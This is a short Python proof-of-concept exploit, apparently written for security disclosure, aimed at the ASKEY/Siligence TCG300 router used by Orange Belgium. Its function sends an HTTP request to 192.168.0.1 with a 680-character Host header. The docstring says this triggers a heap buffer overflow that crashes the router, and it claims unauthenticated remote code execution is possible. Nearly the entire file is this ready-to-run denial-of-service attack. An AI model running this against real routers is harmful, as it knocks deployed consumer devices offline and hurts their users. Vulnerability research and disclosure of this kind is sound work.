#!/usr/bin/env python3
'''
This script demonstrates the heap buffer overflow affecting ASKEY TCG300
aka Siligence TCG300 deployed by Orange Belgium.

The script will simply crash the router, but we demonstrated that
unauthenticated remote code execution can be achieved.

Author: Quentin Kaiser <quentin@ecos.wtf>
'''
import requests

def exploit():
    s = requests.session()
    s.get(
        "http://192.168.0.1/",
        headers={"Host": 'A' * 680},
        allow_redirects=False,
        verify=False,
        timeout=2,
    )

if __name__ == "__main__":
    print("[+] Triggering crash.")
    exploit()
